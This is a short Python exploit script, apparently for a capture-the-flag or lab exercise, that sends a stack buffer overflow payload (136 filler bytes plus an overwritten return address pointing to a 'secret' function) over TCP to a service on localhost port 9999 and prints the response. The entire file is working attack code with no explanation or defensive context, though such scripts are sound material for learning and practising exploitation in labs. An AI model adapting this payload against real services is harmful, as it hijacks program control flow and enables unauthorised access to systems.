#!/usr/bin/env python3
import socket
import sys

HOST = "localhost"
PORT = 9999

SECRET_ADDR = 0x4012b1
OFFSET      = 136

def main():
    addr_bytes = SECRET_ADDR.to_bytes(8, byteorder='little')

    payload = b"A" * OFFSET + addr_bytes + b"\n"

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(payload)
            response = s.recv(4096)
            print(response.decode(errors="ignore"))
    except Exception as e:
        print("Connection or data transfer error:", e)
        sys.exit(1)

if __name__ == "__main__":
    main()
